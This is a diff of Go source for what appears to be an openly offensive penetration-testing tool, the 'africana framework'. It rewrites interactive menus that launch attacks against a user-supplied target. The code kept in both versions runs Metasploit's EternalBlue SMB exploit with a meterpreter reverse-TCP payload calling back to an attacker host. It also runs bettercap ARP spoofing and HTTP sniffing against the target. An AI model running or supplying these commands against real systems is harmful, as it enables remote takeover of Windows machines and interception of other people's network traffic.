@@ -64,53 +64,65 @@ func SmbExploit(userTarget string) {
         return
     }
     menus.MenuThreeOne()
-    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "╰─🐞" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    fmt.Scan(&userInput)
-    switch userInput {
-    case "0":
-        return
-    case "1":
-        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─🐞" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-        reader := bufio.NewReader(os.Stdin)
-        userLport, _ := reader.ReadString('\n')
-        userLport = strings.TrimSpace(userLport)
-        if userLport == "" {
-            userLport = "9999"
+    for {
+        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.BLUE + ")\n" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╰─🦐" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Scan(&userInput)
+        switch userInput {
+        case "0":
+            return
+        case "1":
+            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🦐" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            reader := bufio.NewReader(os.Stdin)
+            userLport, _ := reader.ReadString('\n')
+            userLport = strings.TrimSpace(userLport)
+            if userLport == "" {
+                userLport = "9999"
+            }
+            fmt.Println()
+            subprocess.Popen(`ip address`)
+            fmt.Println()
+            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🦐" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            userLhost, _ := reader.ReadString('\n')
+            userLhost = strings.TrimSpace(userLhost)
+            if userLhost == "" {
+                userLhost = userLhostIp
+            }
+            fmt.Println()
+            subprocess.PopenFour(`msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j"`, userTarget, userLhost, userLport)
+        case "99", "m", "M", "menu", "Menu", "MENU":
+            menus.MenuThreeOne()
+        case "00", "h", "H", "help", "Help", "HELP":
+            menus.HelpMenuThree()
+        default:
+            fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 & 1 " + bcolors.BLUE + ")" + bcolors.ENDC)
         }
-        fmt.Println()
-        subprocess.Popen(`ip address`)
-        fmt.Println()
-        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─🐞" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-        userLhost, _ := reader.ReadString('\n')
-        userLhost = strings.TrimSpace(userLhost)
-        if userLhost == "" {
-            userLhost = userLhostIp
-        }
-        fmt.Println()
-        subprocess.PopenFour(`msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j"`, userTarget, userLhost, userLport)
-    default:
-        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 & 1 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
     fmt.Println()
 }
 
 func PacketSniffer(userTarget string) {
     menus.MenuThreeTwo()
-    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "╰─" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    fmt.Scan(&userInput)
-    switch userInput {
-    case "0":
-        return
-    case "1":
-        subprocess.PopenTwo(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"`, userTarget)
-    case "2":
-        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on"`)
-    default:
-        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
+    for {
+        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.BLUE + ")\n" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╰─🐩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Scan(&userInput)
+        switch userInput {
+        case "0":
+            return
+        case "1":
+            subprocess.PopenTwo(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"`, userTarget)
+        case "2":
+            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on"`)
+        case "99", "m", "M", "menu", "Menu", "MENU":
+            menus.MenuThreeTwo()
+        case "00", "h", "H", "help", "Help", "HELP":
+            menus.HelpMenuThree()
+        default:
+            fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
+        }
     }
     fmt.Println()
 }
@@ -164,7 +176,7 @@ func BeefBettercap(userTarget string) {
     }
     menus.MenuThreeThree()
     fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "╰─" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     fmt.Scan(&userInput)
     switch userInput {
     case "0":
@@ -199,7 +211,7 @@ func BeefBettercap(userTarget string) {
         subprocess.Popen(`ip address`)
         fmt.Println()
         fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         reader := bufio.NewReader(os.Stdin)
         userLhost, _ := reader.ReadString('\n')
         userLhost = strings.TrimSpace(userLhost)
@@ -241,7 +253,7 @@ func BeefBettercap(userTarget string) {
         subprocess.Popen(`ip address`)
         fmt.Println()
         fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         reader := bufio.NewReader(os.Stdin)
         userLhost, _ := reader.ReadString('\n')
         userLhost = strings.TrimSpace(userLhost)
